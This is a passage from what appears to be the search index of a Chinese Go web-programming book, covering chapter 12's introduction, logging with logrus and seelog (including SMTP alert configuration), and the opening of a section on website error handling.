b\u540e\u4ee3\u7801\u80fd\u591f\u4fdd\u6301\u826f\u597d\u7684\u6027\u80fd\u548c\u6309\u9884\u671f\u7684\u8fd0\u884c\u3002</p>"},{"location":"11.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u600e\u4e48\u5199\u6d4b\u8bd5\u7528\u4f8b</li> <li>\u4e0b\u4e00\u8282: \u90e8\u7f72\u4e0e\u7ef4\u62a4</li> </ul>"},{"location":"12.0/","title":"12 \u90e8\u7f72\u4e0e\u7ef4\u62a4","text":"<p>\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u524d\u9762\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u5982\u4f55\u5f00\u53d1\u7a0b\u5e8f\u3001\u8c03\u8bd5\u7a0b\u5e8f\u4ee5\u53ca\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u6b63\u5982\u4eba\u4eec\u5e38\u8bf4\u7684\uff1a\u5f00\u53d1\u6700\u540e\u768410%\u9700\u8981\u82b1\u8d3990%\u7684\u65f6\u95f4\uff0c\u6240\u4ee5\u8fd9\u4e00\u7ae0\u6211\u4eec\u5c06\u5f3a\u8c03\u8fd9\u6700\u540e\u768410%\u90e8\u5206\uff0c\u8981\u771f\u6b63\u6210\u4e3a\u8ba9\u4eba\u4fe1\u4efb\u5e76\u4f7f\u7528\u7684\u4f18\u79c0\u5e94\u7528\uff0c\u9700\u8981\u8003\u8651\u5230\u4e00\u4e9b\u7ec6\u8282\uff0c\u4ee5\u4e0a\u6240\u8bf4\u768410%\u5c31\u662f\u6307\u8fd9\u4e9b\u5c0f\u7ec6\u8282\u3002</p> <p>\u672c\u7ae0\u6211\u4eec\u5c06\u901a\u8fc7\u56db\u4e2a\u5c0f\u8282\u6765\u4ecb\u7ecd\u8fd9\u4e9b\u5c0f\u7ec6\u8282\u7684\u5904\u7406\uff0c\u7b2c\u4e00\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u5728\u751f\u4ea7\u670d\u52a1\u4e0a\u8bb0\u5f55\u7a0b\u5e8f\u4ea7\u751f\u7684\u65e5\u5fd7\uff0c\u5982\u4f55\u8bb0\u5f55\u65e5\u5fd7\uff0c\u7b2c\u4e8c\u5c0f\u8282\u4ecb\u7ecd\u53d1\u751f\u9519\u8bef\u65f6\u6211\u4eec\u7684\u7a0b\u5e8f\u5982\u4f55\u5904\u7406\uff0c\u5982\u4f55\u4fdd\u8bc1\u5c3d\u91cf\u5c11\u7684\u5f71\u54cd\u5230\u7528\u6237\u7684\u8bbf\u95ee\uff0c\u7b2c\u4e09\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u6765\u90e8\u7f72Go\u7684\u72ec\u7acb\u7a0b\u5e8f\uff0c\u7531\u4e8e\u76ee\u524dGo\u7a0b\u5e8f\u8fd8\u65e0\u6cd5\u50cfC\u90a3\u6837\u5199\u6210daemon\uff0c\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u7ba1\u7406\u8fd9\u6837\u7684\u8fdb\u7a0b\u7a0b\u5e8f\u540e\u53f0\u8fd0\u884c\u5462\uff1f\u7b2c\u56db\u5c0f\u8282\u5c06\u4ecb\u7ecd\u5e94\u7528\u6570\u636e\u7684\u5907\u4efd\u548c\u6062\u590d\uff0c\u5c3d\u91cf\u4fdd\u8bc1\u5e94\u7528\u5728\u5d29\u6e83\u7684\u60c5\u51b5\u80fd\u591f\u4fdd\u6301\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002</p>"},{"location":"12.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"12.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u5341\u4e00\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u5e94\u7528\u65e5\u5fd7</li> </ul>"},{"location":"12.1/","title":"12.1 \u5e94\u7528\u65e5\u5fd7","text":"<p>\u6211\u4eec\u671f\u671b\u5f00\u53d1\u7684Web\u5e94\u7528\u7a0b\u5e8f\u80fd\u591f\u628a\u6574\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u5404\u79cd\u4e8b\u4ef6\u4e00\u4e00\u8bb0\u5f55\u4e0b\u6765\uff0cGo\u8bed\u8a00\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u6613\u7684log\u5305\uff0c\u6211\u4eec\u4f7f\u7528\u8be5\u5305\u53ef\u4ee5\u65b9\u4fbf\u7684\u5b9e\u73b0\u65e5\u5fd7\u8bb0\u5f55\u7684\u529f\u80fd\uff0c\u8fd9\u4e9b\u65e5\u5fd7\u90fd\u662f\u57fa\u4e8efmt\u5305\u7684\u6253\u5370\u518d\u7ed3\u5408panic\u4e4b\u7c7b\u7684\u51fd\u6570\u6765\u8fdb\u884c\u4e00\u822c\u7684\u6253\u5370\u3001\u629b\u51fa\u9519\u8bef\u5904\u7406\u3002Go\u76ee\u524d\u6807\u51c6\u5305\u53ea\u662f\u5305\u542b\u4e86\u7b80\u5355\u7684\u529f\u80fd\uff0c\u5982\u679c\u6211\u4eec\u60f3\u628a\u6211\u4eec\u7684\u5e94\u7528\u65e5\u5fd7\u4fdd\u5b58\u5230\u6587\u4ef6\uff0c\u7136\u540e\u53c8\u80fd\u591f\u7ed3\u5408\u65e5\u5fd7\u5b9e\u73b0\u5f88\u591a\u590d\u6742\u7684\u529f\u80fd\uff08\u7f16\u5199\u8fc7Java\u6216\u8005C++\u7684\u8bfb\u8005\u5e94\u8be5\u90fd\u4f7f\u7528\u8fc7log4j\u548clog4cpp\u4e4b\u7c7b\u7684\u65e5\u5fd7\u5de5\u5177\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5f00\u53d1\u7684\u65e5\u5fd7\u7cfb\u7edf:logrus\u548cseelog\uff0c\u5b83\u4eec\u5b9e\u73b0\u4e86\u5f88\u5f3a\u5927\u7684\u65e5\u5fd7\u529f\u80fd\uff0c\u53ef\u4ee5\u7ed3\u5408\u81ea\u5df1\u9879\u76ee\u9009\u62e9\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u4ecb\u7ecd\u5982\u4f55\u901a\u8fc7\u8be5\u65e5\u5fd7\u7cfb\u7edf\u6765\u5b9e\u73b0\u6211\u4eec\u5e94\u7528\u7684\u65e5\u5fd7\u529f\u80fd\u3002</p>"},{"location":"12.1/#logrus","title":"logrus\u4ecb\u7ecd","text":"<p>logrus\u662f\u7528Go\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u65e5\u5fd7\u7cfb\u7edf\uff0c\u4e0e\u6807\u51c6\u5e93log\u5b8c\u5168\u517c\u5bb9\u5e76\u4e14\u6838\u5fc3API\u5f88\u7a33\u5b9a,\u662fGo\u8bed\u8a00\u76ee\u524d\u6700\u6d3b\u8dc3\u7684\u65e5\u5fd7\u5e93</p> <p>\u9996\u5148\u5b89\u88c5logrus <pre><code>go get -u github.com/sirupsen/logrus\n</code></pre></p> <p>\u7b80\u5355\u4f8b\u5b50:</p> <pre><code>package main\n\nimport (\nlog \"github.com/Sirupsen/logrus\"\n)\n\nfunc main() {\nlog.WithFields(log.Fields{\n\"animal\": \"walrus\",\n}).Info(\"A walrus appears\")\n}\n</code></pre>"},{"location":"12.1/#logrus_1","title":"\u57fa\u4e8elogrus\u7684\u81ea\u5b9a\u4e49\u65e5\u5fd7\u5904\u7406","text":"<pre><code>package main\n\nimport (\n\"os\"\n\nlog \"github.com/Sirupsen/logrus\"\n)\n\nfunc init() {\n// \u65e5\u5fd7\u683c\u5f0f\u5316\u4e3aJSON\u800c\u4e0d\u662f\u9ed8\u8ba4\u7684ASCII\nlog.SetFormatter(&amp;log.JSONFormatter{})\n\n// \u8f93\u51fastdout\u800c\u4e0d\u662f\u9ed8\u8ba4\u7684stderr\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u6587\u4ef6\nlog.SetOutput(os.Stdout)\n\n// \u53ea\u8bb0\u5f55\u4e25\u91cd\u6216\u4ee5\u4e0a\u8b66\u544a\nlog.SetLevel(log.WarnLevel)\n}\n\nfunc main() {\nlog.WithFields(log.Fields{\n\"animal\": \"walrus\",\n\"size\":   10,\n}).Info(\"A group of walrus emerges from the ocean\")\n\nlog.WithFields(log.Fields{\n\"omg\":    true,\n\"number\": 122,\n}).Warn(\"The group's number increased tremendously!\")\n\nlog.WithFields(log.Fields{\n\"omg\":    true,\n\"number\": 100,\n}).Fatal(\"The ice breaks!\")\n\n// \u901a\u8fc7\u65e5\u5fd7\u8bed\u53e5\u91cd\u7528\u5b57\u6bb5\n// logrus.Entry\u8fd4\u56de\u81eaWithFields()\ncontextLogger := log.WithFields(log.Fields{\n\"common\": \"this is a common field\",\n\"other\":  \"I also should be logged always\",\n})\n\ncontextLogger.Info(\"I'll be logged with common and other field\")\ncontextLogger.Info(\"Me too\")\n}\n</code></pre>"},{"location":"12.1/#seelog","title":"seelog\u4ecb\u7ecd","text":"<p>seelog\u662f\u7528Go\u8bed\u8a00\u5b9e\u73b0\u7684\u4e00\u4e2a\u65e5\u5fd7\u7cfb\u7edf\uff0c\u5b83\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7b80\u5355\u7684\u51fd\u6570\u6765\u5b9e\u73b0\u590d\u6742\u7684\u65e5\u5fd7\u5206\u914d\u3001\u8fc7\u6ee4\u548c\u683c\u5f0f\u5316\u3002\u4e3b\u8981\u6709\u5982\u4e0b\u7279\u6027\uff1a</p> <ul> <li>XML\u7684\u52a8\u6001\u914d\u7f6e\uff0c\u53ef\u4ee5\u4e0d\u7528\u91cd\u65b0\u7f16\u8bd1\u7a0b\u5e8f\u800c\u52a8\u6001\u7684\u52a0\u8f7d\u914d\u7f6e\u4fe1\u606f</li> <li>\u652f\u6301\u70ed\u66f4\u65b0\uff0c\u80fd\u591f\u52a8\u6001\u6539\u53d8\u914d\u7f6e\u800c\u4e0d\u9700\u8981\u91cd\u542f\u5e94\u7528</li> <li>\u652f\u6301\u591a\u8f93\u51fa\u6d41\uff0c\u80fd\u591f\u540c\u65f6\u628a\u65e5\u5fd7\u8f93\u51fa\u5230\u591a\u79cd\u6d41\u4e2d\u3001\u4f8b\u5982\u6587\u4ef6\u6d41\u3001\u7f51\u7edc\u6d41\u7b49</li> <li> <p>\u652f\u6301\u4e0d\u540c\u7684\u65e5\u5fd7\u8f93\u51fa</p> <ul> <li>\u547d\u4ee4\u884c\u8f93\u51fa</li> <li>\u6587\u4ef6\u8f93\u51fa</li> <li>\u7f13\u5b58\u8f93\u51fa</li> <li>\u652f\u6301log rotate</li> <li>SMTP\u90ae\u4ef6</li> </ul> </li> </ul> <p>\u4e0a\u9762\u53ea\u5217\u4e3e\u4e86\u90e8\u5206\u7279\u6027\uff0cseelog\u662f\u4e00\u4e2a\u7279\u522b\u5f3a\u5927\u7684\u65e5\u5fd7\u5904\u7406\u7cfb\u7edf\uff0c\u8be6\u7ec6\u7684\u5185\u5bb9\u8bf7\u53c2\u770b\u5b98\u65b9wiki\u3002\u63a5\u4e0b\u6765\u6211\u5c06\u7b80\u8981\u4ecb\u7ecd\u4e00\u4e0b\u5982\u4f55\u5728\u9879\u76ee\u4e2d\u4f7f\u7528\u5b83\uff1a</p> <p>\u9996\u5148\u5b89\u88c5seelog <pre><code>go get -u github.com/cihub/seelog\n</code></pre> \u7136\u540e\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a <pre><code>package main\n\nimport log \"github.com/cihub/seelog\"\n\nfunc main() {\ndefer log.Flush()\nlog.Info(\"Hello from Seelog!\")\n}\n</code></pre> \u7f16\u8bd1\u540e\u8fd0\u884c\u5982\u679c\u51fa\u73b0\u4e86<code>Hello from seelog</code>\uff0c\u8bf4\u660eseelog\u65e5\u5fd7\u7cfb\u7edf\u5df2\u7ecf\u6210\u529f\u5b89\u88c5\u5e76\u4e14\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u4e86\u3002</p>"},{"location":"12.1/#seelog_1","title":"\u57fa\u4e8eseelog\u7684\u81ea\u5b9a\u4e49\u65e5\u5fd7\u5904\u7406","text":"<p>seelog\u652f\u6301\u81ea\u5b9a\u4e49\u65e5\u5fd7\u5904\u7406\uff0c\u4e0b\u9762\u662f\u6211\u57fa\u4e8e\u5b83\u81ea\u5b9a\u4e49\u7684\u65e5\u5fd7\u5904\u7406\u5305\u7684\u90e8\u5206\u5185\u5bb9\uff1a <pre><code>package logs\n\nimport (\n// \"errors\"\n\"fmt\"\n// \"io\"\n\nseelog \"github.com/cihub/seelog\"\n)\n\nvar Logger seelog.LoggerInterface\n\nfunc loadAppConfig() {\nappConfig := `\n&lt;seelog minlevel=\"warn\"&gt;\n    &lt;outputs formatid=\"common\"&gt;\n        &lt;rollingfile type=\"size\" filename=\"/data/logs/roll.log\" maxsize=\"100000\" maxrolls=\"5\"/&gt;\n        &lt;filter levels=\"critical\"&gt;\n            &lt;file path=\"/data/logs/critical.log\" formatid=\"critical\"/&gt;\n            &lt;smtp formatid=\"criticalemail\" senderaddress=\"astaxie@gmail.com\" sendername=\"ShortUrl API\" hostname=\"smtp.gmail.com\" hostport=\"587\" username=\"mailusername\" password=\"mailpassword\"&gt;\n                &lt;recipient address=\"xiemengjun@gmail.com\"/&gt;\n            &lt;/smtp&gt;\n        &lt;/filter&gt;\n    &lt;/outputs&gt;\n    &lt;formats&gt;\n        &lt;format id=\"common\" format=\"%Date/%Time [%LEV] %Msg%n\" /&gt;\n        &lt;format id=\"critical\" format=\"%File %FullPath %Func %Msg%n\" /&gt;\n        &lt;format id=\"criticalemail\" format=\"Critical error on our server!\\n    %Time %Date %RelFile %Func %Msg \\nSent by Seelog\"/&gt;\n    &lt;/formats&gt;\n&lt;/seelog&gt;\n`\nlogger, err := seelog.LoggerFromConfigAsBytes([]byte(appConfig))\nif err != nil {\nfmt.Println(err)\nreturn\n}\nUseLogger(logger)\n}\n\nfunc init() {\nDisableLog()\nloadAppConfig()\n}\n\n// DisableLog disables all library log output\nfunc DisableLog() {\nLogger = seelog.Disabled\n}\n\n// UseLogger uses a specified seelog.LoggerInterface to output library log.\n// Use this func if you are using Seelog logging system in your app.\nfunc UseLogger(newLogger seelog.LoggerInterface) {\nLogger = newLogger\n}\n</code></pre> \u4e0a\u9762\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e09\u4e2a\u51fd\u6570\uff0c</p> <ul> <li> <p><code>DisableLog</code></p> <p>\u521d\u59cb\u5316\u5168\u5c40\u53d8\u91cfLogger\u4e3aseelog\u7684\u7981\u7528\u72b6\u6001\uff0c\u4e3b\u8981\u4e3a\u4e86\u9632\u6b62Logger\u88ab\u591a\u6b21\u521d\u59cb\u5316 - <code>loadAppConfig</code></p> <p>\u6839\u636e\u914d\u7f6e\u6587\u4ef6\u521d\u59cb\u5316seelog\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u8fd9\u91cc\u6211\u4eec\u628a\u914d\u7f6e\u6587\u4ef6\u901a\u8fc7\u5b57\u7b26\u4e32\u8bfb\u53d6\u8bbe\u7f6e\u597d\u4e86\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8bfb\u53d6XML\u6587\u4ef6\u3002\u91cc\u9762\u7684\u914d\u7f6e\u8bf4\u660e\u5982\u4e0b\uff1a</p> <ul> <li> <p>seelog </p> <p>minlevel\u53c2\u6570\u53ef\u9009\uff0c\u5982\u679c\u88ab\u914d\u7f6e,\u9ad8\u4e8e\u6216\u7b49\u4e8e\u6b64\u7ea7\u522b\u7684\u65e5\u5fd7\u4f1a\u88ab\u8bb0\u5f55\uff0c\u540c\u7406maxlevel\u3002     - outputs</p> <p>\u8f93\u51fa\u4fe1\u606f\u7684\u76ee\u7684\u5730\uff0c\u8fd9\u91cc\u5206\u6210\u4e86\u4e24\u4efd\u6570\u636e\uff0c\u4e00\u4efd\u8bb0\u5f55\u5230log rotate\u6587\u4ef6\u91cc\u9762\u3002\u53e6\u4e00\u4efd\u8bbe\u7f6e\u4e86filter\uff0c\u5982\u679c\u8fd9\u4e2a\u9519\u8bef\u7ea7\u522b\u662fcritical\uff0c\u90a3\u4e48\u5c06\u53d1\u9001\u62a5\u8b66\u90ae\u4ef6\u3002</p> </li> <li> <p>formats</p> <p>\u5b9a\u4e49\u4e86\u5404\u79cd\u65e5\u5fd7\u7684\u683c\u5f0f</p> </li> </ul> </li> <li> <p><code>UseLogger</code></p> <p>\u8bbe\u7f6e\u5f53\u524d\u7684\u65e5\u5fd7\u5668\u4e3a\u76f8\u5e94\u7684\u65e5\u5fd7\u5904\u7406</p> </li> </ul> <p>\u4e0a\u9762\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u65e5\u5fd7\u5904\u7406\u5305\uff0c\u4e0b\u9762\u5c31\u662f\u4f7f\u7528\u793a\u4f8b\uff1a <pre><code>package main\n\nimport (\n\"net/http\"\n\"project/logs\"\n\"project/configs\"\n\"project/routes\"\n)\n\nfunc main() {\naddr, _ := configs.MainConfig.String(\"server\", \"addr\")\nlogs.Logger.Info(\"Start server at:%v\", addr)\nerr := http.ListenAndServe(addr, routes.NewMux())\nlogs.Logger.Critical(\"Server err:%v\", err)\n}\n</code></pre></p>"},{"location":"12.1/#_1","title":"\u53d1\u751f\u9519\u8bef\u53d1\u9001\u90ae\u4ef6","text":"<p>\u4e0a\u9762\u7684\u4f8b\u5b50\u89e3\u91ca\u4e86\u5982\u4f55\u8bbe\u7f6e\u53d1\u9001\u90ae\u4ef6\uff0c\u6211\u4eec\u901a\u8fc7\u5982\u4e0b\u7684smtp\u914d\u7f6e\u7528\u6765\u53d1\u9001\u90ae\u4ef6\uff1a <pre><code>&lt;smtp formatid=\"criticalemail\" senderaddress=\"astaxie@gmail.com\" sendername=\"ShortUrl API\" hostname=\"smtp.gmail.com\" hostport=\"587\" username=\"mailusername\" password=\"mailpassword\"&gt;\n    &lt;recipient address=\"xiemengjun@gmail.com\"/&gt;\n&lt;/smtp&gt;\n</code></pre> \u90ae\u4ef6\u7684\u683c\u5f0f\u901a\u8fc7criticalemail\u914d\u7f6e\uff0c\u7136\u540e\u901a\u8fc7\u5176\u4ed6\u7684\u914d\u7f6e\u53d1\u9001\u90ae\u4ef6\u670d\u52a1\u5668\u7684\u914d\u7f6e\uff0c\u901a\u8fc7recipient\u914d\u7f6e\u63a5\u6536\u90ae\u4ef6\u7684\u7528\u6237\uff0c\u5982\u679c\u6709\u591a\u4e2a\u7528\u6237\u53ef\u4ee5\u518d\u6dfb\u52a0\u4e00\u884c\u3002</p> <p>\u8981\u6d4b\u8bd5\u8fd9\u4e2a\u4ee3\u7801\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\uff0c\u53ef\u4ee5\u5728\u4ee3\u7801\u4e2d\u589e\u52a0\u7c7b\u4f3c\u4e0b\u9762\u7684\u4e00\u4e2a\u5047\u6d88\u606f\u3002\u4e0d\u8fc7\u8bb0\u4f4f\u8fc7\u540e\u8981\u628a\u5b83\u5220\u9664\uff0c\u5426\u5219\u4e0a\u7ebf\u4e4b\u540e\u5c31\u4f1a\u6536\u5230\u5f88\u591a\u5783\u573e\u90ae\u4ef6\u3002 <pre><code>logs.Logger.Critical(\"test Critical message\")\n</code></pre> \u73b0\u5728\uff0c\u53ea\u8981\u6211\u4eec\u7684\u5e94\u7528\u5728\u7ebf\u4e0a\u8bb0\u5f55\u4e00\u4e2aCritical\u7684\u4fe1\u606f\uff0c\u4f60\u7684\u90ae\u7bb1\u5c31\u4f1a\u6536\u5230\u4e00\u4e2aEmail\uff0c\u8fd9\u6837\u4e00\u65e6\u7ebf\u4e0a\u7684\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\uff0c\u4f60\u5c31\u80fd\u7acb\u9a6c\u901a\u8fc7\u90ae\u4ef6\u83b7\u77e5\uff0c\u5c31\u80fd\u53ca\u65f6\u7684\u8fdb\u884c\u5904\u7406\u3002           </p>"},{"location":"12.1/#_2","title":"\u4f7f\u7528\u5e94\u7528\u65e5\u5fd7","text":"<p>\u5bf9\u4e8e\u5e94\u7528\u65e5\u5fd7\uff0c\u6bcf\u4e2a\u4eba\u7684\u5e94\u7528\u573a\u666f\u53ef\u80fd\u4f1a\u5404\u4e0d\u76f8\u540c\uff0c\u6709\u4e9b\u4eba\u5229\u7528\u5e94\u7528\u65e5\u5fd7\u6765\u505a\u6570\u636e\u5206\u6790\uff0c\u6709\u4e9b\u4eba\u5229\u7528\u5e94\u7528\u65e5\u5fd7\u6765\u505a\u6027\u80fd\u5206\u6790\uff0c\u6709\u4e9b\u4eba\u6765\u505a\u7528\u6237\u884c\u4e3a\u5206\u6790\uff0c\u8fd8\u6709\u4e9b\u5c31\u662f\u7eaf\u7cb9\u7684\u8bb0\u5f55\uff0c\u4ee5\u65b9\u4fbf\u5e94\u7528\u51fa\u73b0\u95ee\u9898\u7684\u65f6\u5019\u8f85\u52a9\u67e5\u627e\u95ee\u9898\u3002</p> <p>\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u9700\u8981\u8ddf\u8e2a\u7528\u6237\u5c1d\u8bd5\u767b\u9646\u7cfb\u7edf\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u4f1a\u628a\u6210\u529f\u4e0e\u4e0d\u6210\u529f\u7684\u5c1d\u8bd5\u90fd\u8bb0\u5f55\u4e0b\u6765\u3002\u8bb0\u5f55\u6210\u529f\u7684\u4f7f\u7528\"Info\"\u65e5\u5fd7\u7ea7\u522b\uff0c\u800c\u4e0d\u6210\u529f\u7684\u4f7f\u7528\"warn\"\u7ea7\u522b\u3002\u5982\u679c\u60f3\u67e5\u627e\u6240\u6709\u4e0d\u6210\u529f\u7684\u767b\u9646\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528linux\u7684grep\u4e4b\u7c7b\u7684\u547d\u4ee4\u5de5\u5177\uff0c\u5982\u4e0b\uff1a <pre><code># cat /data/logs/roll.log | grep \"failed login\"\n2012-12-11 11:12:00 WARN : failed login attempt from 11.22.33.44 username password\n</code></pre> \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u67e5\u627e\u76f8\u5e94\u7684\u4fe1\u606f\uff0c\u8fd9\u6837\u6709\u5229\u4e8e\u6211\u4eec\u9488\u5bf9\u5e94\u7528\u65e5\u5fd7\u505a\u4e00\u4e9b\u7edf\u8ba1\u548c\u5206\u6790\u3002\u53e6\u5916\u6211\u4eec\u8fd8\u9700\u8981\u8003\u8651\u65e5\u5fd7\u7684\u5927\u5c0f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u9ad8\u6d41\u91cf\u7684Web\u5e94\u7528\u6765\u8bf4\uff0c\u65e5\u5fd7\u7684\u589e\u957f\u662f\u76f8\u5f53\u53ef\u6015\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5728seelog\u7684\u914d\u7f6e\u6587\u4ef6\u91cc\u9762\u8bbe\u7f6e\u4e86logrotate\uff0c\u8fd9\u6837\u5c31\u80fd\u4fdd\u8bc1\u65e5\u5fd7\u6587\u4ef6\u4e0d\u4f1a\u56e0\u4e3a\u4e0d\u65ad\u53d8\u5927\u800c\u5bfc\u81f4\u6211\u4eec\u7684\u78c1\u76d8\u7a7a\u95f4\u4e0d\u591f\u5f15\u8d77\u95ee\u9898\u3002</p>"},{"location":"12.1/#_3","title":"\u5c0f\u7ed3","text":"<p>\u901a\u8fc7\u4e0a\u9762\u5bf9seelog\u7cfb\u7edf\u53ca\u5982\u4f55\u57fa\u4e8e\u5b83\u8fdb\u884c\u81ea\u5b9a\u4e49\u65e5\u5fd7\u7cfb\u7edf\u7684\u5b66\u4e60\uff0c\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u968f\u9700\u6784\u5efa\u4e00\u4e2a\u5408\u9002\u7684\u529f\u80fd\u5f3a\u5927\u7684\u65e5\u5fd7\u5904\u7406\u7cfb\u7edf\u4e86\u3002\u65e5\u5fd7\u5904\u7406\u7cfb\u7edf\u4e3a\u6570\u636e\u5206\u6790\u63d0\u4f9b\u4e86\u53ef\u9760\u7684\u6570\u636e\u6e90\uff0c\u6bd4\u5982\u901a\u8fc7\u5bf9\u65e5\u5fd7\u7684\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u4f18\u5316\u7cfb\u7edf\uff0c\u6216\u8005\u5e94\u7528\u51fa\u73b0\u95ee\u9898\u65f6\u65b9\u4fbf\u67e5\u627e\u5b9a\u4f4d\u95ee\u9898\uff0c\u53e6\u5916seelog\u4e5f\u63d0\u4f9b\u4e86\u65e5\u5fd7\u5206\u7ea7\u529f\u80fd\uff0c\u901a\u8fc7\u5bf9minlevel\u7684\u914d\u7f6e\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8bbe\u7f6e\u6d4b\u8bd5\u6216\u53d1\u5e03\u7248\u672c\u7684\u8f93\u51fa\u6d88\u606f\u7ea7\u522b\u3002</p>"},{"location":"12.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u90e8\u7f72\u4e0e\u7ef4\u62a4</li> <li>\u4e0b\u4e00\u8282: \u7f51\u7ad9\u9519\u8bef\u5904\u7406</li> </ul>"},{"location":"12.2/","title":"12.2 \u7f51\u7ad9\u9519\u8bef\u5904\u7406","text":""},{"location":"12.2/#122","title":"12.2 \u7f51\u7ad9\u9519\u8bef\u5904\u7406","text":"<p>\u6211\u4eec\u7684Web\u5e94\u7528\u4e00\u65e6\u4e0a\u7ebf\u4e4b\u540e\uff0c\u90a3\u4e48\u5404\u79cd\u9519\u8bef\u51fa\u73b0\u7684\u6982\u7387\u90fd\u6709\uff0cWeb\u5e94\u7528\u65e5\u5e38\u8fd0\u884c\u4e2d\u53ef\u80fd\u51fa\u73b0\u591a\u79cd\u9519\u8bef\uff0c\u5177\u4f53\u5982\u4e0b\u6240\u793a\uff1a</p> <ul> <li> <p>\u6570\u636e\u5e93\u9519\u8bef\uff1a\u6307\u4e0e\u8bbf\u95ee\u6570\u636e\u5e93\u670d\u52a1\u5668\u6216\u6570\u636e\u76f8\u5173\u7684\u9519\u8bef\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u53ef\u80fd\u51fa\u73b0\u7684\u4e00\u4e9b\u6570\u636e\u5e93\u9519\u8bef\u3002</p> <ul> <li>\u8fde\u63a5\u9519\u8bef\uff1a\u8fd9\u4e00\u7c7b\u9519\u8bef\u53ef\u80fd\u662f\u6570\u636e\u5e93\u670d\u52a1\u5668\u7f51\u7edc\u65ad\u5f00\u3001\u7528\u6237\u540d\u5bc6\u7801\u4e0d\u6b63\u786e\u3001\u6216\u8005\u6570\u636e\u5e93\u4e0d\u5b58\u5728\u3002</li> <li>\u67e5\u8be2\u9519\u8bef\uff1a\u4f7f\u7528\u7684SQL\u975e\u6cd5\u5bfc\u81f4\u9519\u8bef\uff0c\u8fd9\u6837\u5b50SQL\u9519\u8bef\u5982\u679c\u7a0b\u5e8f\u7ecf\u8fc7\u4e25\u683c\u7684\u6d4b\u8bd5\u5e94\u8be5\u53ef\u4ee5\u907f\u514d\u3002</li> <li>\u6570\u636e\u9519\u8bef\uff1a\u6570\u636e\u5e93\u4e2d\u7684\u7ea6\u675f\u51b2\u7a81\uff0c\u4f8b\u5982\u4e00\u4e2a\u552f\u4e00\u5b57\u6bb5\u4e2d\u63d2\u5165\u4e00\u6761\u91cd\u590d\u4e3b\u952e\u7684\u503c\u5c31\u4f1a\u62a5\u9519\uff0c\u4f46\u662f\u5982\u679c\u4f60\u7684\u5e94\u7528\u7a0b\u5e8f\u5728\u4e0a\u7ebf\u4e4b\u524d\u7ecf\u8fc7\u4e86\u4e25\u683c\u7684\u6d4b\u8bd5\u4e5f\u662f\u53ef\u4ee5\u907f\u514d\u8fd9\u7c7b\u95ee\u9898\u3002</li> <li> <p>\u5e94\u7528\u8fd0\u884c\u65f6\u9519\u8bef\uff1a\u8fd9\u7c7b\u9519\u8bef\u8303\u56f4\u5f88\u5e7f\uff0c\u6db5\u76d6\u4e86\u4ee3\u7801\u4e2d\u51fa\u73b0\u7684\u51e0\u4e4e\u6240\u6709\u9519\u8bef\u3002\u53ef\u80fd\u7684\u5e94\u7528\u9519\u8bef\u7684\u60c5\u51b5\u5982\u4e0b\uff1a</p> </li> <li> 